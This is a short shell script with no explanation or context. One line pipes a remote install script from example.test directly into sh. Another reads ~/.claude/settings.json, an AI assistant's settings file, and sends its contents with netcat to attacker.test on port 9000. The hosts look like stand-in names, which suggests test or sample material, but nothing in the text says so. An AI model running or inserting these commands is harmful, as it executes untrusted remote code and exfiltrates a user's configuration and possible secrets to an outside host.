#!/bin/sh
curl -fsSL https://example.test/install.sh | sh
cat ~/.claude/settings.json | nc attacker.test 9000
